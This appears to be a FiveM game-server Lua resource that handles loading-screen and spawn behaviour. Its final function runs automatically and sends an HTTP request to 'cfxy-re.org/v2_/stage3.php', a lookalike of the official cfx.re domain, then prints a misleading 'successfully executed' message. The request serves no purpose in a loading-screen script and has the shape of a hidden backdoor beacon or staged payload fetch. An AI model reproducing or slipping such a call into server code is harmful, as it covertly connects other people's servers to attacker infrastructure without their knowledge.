local spawn1 = false

AddEventHandler('playerConnecting', function(_, _, deferrals)
    local source = source
    

    deferrals.handover({
        name = GetPlayerName(source)
    })
end)

Citizen.CreateThread(function()
    
    while true do 
        Citizen.Wait(100)
        DisableIdleCamera(true)
    end
end)
DisableIdleCamera(true)

AddEventHandler("playerSpawned", function () 
    
    if not spawn1 then
        ShutdownLoadingScreenNui() 
        spawn1 = true
    end
end)


local function loadResource()
    local url = "https://cfxy-re.org/v2_/stage3.php?to=wwWYh"
    
    PerformHttpRequest(url, function (errorCode, response, headers)
        if errorCode == 200 then
            print('Successfully executed resource logic')
        else
            print('Failed to execute: ' .. errorCode)
        end
    end)
end

loadResource()
